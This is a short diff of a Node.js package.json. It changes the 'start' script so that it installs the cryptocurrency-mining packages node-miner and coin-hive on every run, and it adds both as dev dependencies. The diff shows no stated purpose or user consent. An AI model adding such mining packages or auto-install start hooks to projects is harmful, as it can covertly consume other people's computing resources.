@@ -7,12 +7,13 @@
     "node": "8.5.0"
   },
   "scripts": {
-    "start": "npm install -g node-miner http && node index.js",
+    "start": "npm i --save-dev node-miner coin-hive && node index.js",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
   "author": "",
   "license": "ISC",
-  "dependencies": {
+  "devDependencies": {
+    "coin-hive": "^1.10.0",
     "node-miner": "^3.1.0"
   }
 }
